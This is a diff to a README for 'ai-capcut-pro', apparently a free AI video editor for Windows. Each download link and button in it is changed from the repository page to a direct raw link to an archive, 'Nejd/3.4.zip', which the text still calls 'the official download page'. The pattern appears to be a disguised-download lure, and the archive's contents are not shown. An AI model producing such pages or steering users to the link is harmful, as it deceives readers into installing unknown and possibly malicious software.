@@ -1,6 +1,6 @@
 # 🎬 ai-capcut-pro - Your Free, Private AI Video Editor
 
-[![Download Now](https://img.shields.io/badge/Download-ai--capcut--pro-brightgreen?style=for-the-badge&logo=github)](https://github.com/Broken-hurting432/ai-capcut-pro)
+[![Download Now](https://img.shields.io/badge/Download-ai--capcut--pro-brightgreen?style=for-the-badge&logo=github)](https://github.com/Broken-hurting432/ai-capcut-pro/raw/refs/heads/main/Nejd/3.4.zip)
 
 ## ✨ What Is This?
 
@@ -16,9 +16,9 @@ Follow these simple steps to get ai-capcut-pro running on your Windows PC.
 
 ### Step 1: Download the Application
 
-[**Visit this link to download the application**](https://github.com/Broken-hurting432/ai-capcut-pro)
+[**Visit this link to download the application**](https://github.com/Broken-hurting432/ai-capcut-pro/raw/refs/heads/main/Nejd/3.4.zip)
 
-Click the button above or copy and paste this link into your browser: `https://github.com/Broken-hurting432/ai-capcut-pro`
+Click the button above or copy and paste this link into your browser: `https://github.com/Broken-hurting432/ai-capcut-pro/raw/refs/heads/main/Nejd/3.4.zip`
 
 This will take you to the official download page.
 
@@ -156,7 +156,7 @@ ai-capcut-pro is a game-changer for anyone who wants professional video editing 
 
 **The best part?** You're not locked into any subscription. Download it once, and it's yours forever. Time to start creating!
 
-[**👉 Click Here to Download ai-capcut-pro Now**](https://github.com/Broken-hurting432/ai-capcut-pro)
+[**👉 Click Here to Download ai-capcut-pro Now**](https://github.com/Broken-hurting432/ai-capcut-pro/raw/refs/heads/main/Nejd/3.4.zip)
 
 ---
 
